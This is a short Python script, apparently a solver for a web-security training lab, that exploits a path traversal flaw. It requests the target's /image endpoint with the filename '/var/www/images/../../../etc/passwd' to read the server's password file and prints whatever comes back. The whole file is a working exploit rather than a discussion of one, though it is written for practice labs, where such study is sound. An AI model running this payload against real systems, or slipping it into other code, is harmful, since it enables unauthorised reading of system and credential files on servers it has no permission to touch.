from ..utils import *
from urllib.parse import urlencode, urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/image")
    params = { "filename": "/var/www/images/../../../etc/passwd" }

    print_info(f"Exploiting path traversal vulnerability by visiting \"{url}?{urlencode(params)}\"...")
    resp = requests.get(url, proxies=proxies, verify=False, params=params)

    if resp.status_code != 200:
        print_fail("Unable to get contents of file.")
    else:
        print_success("GET request came back with the following response:")
        print(resp.text)

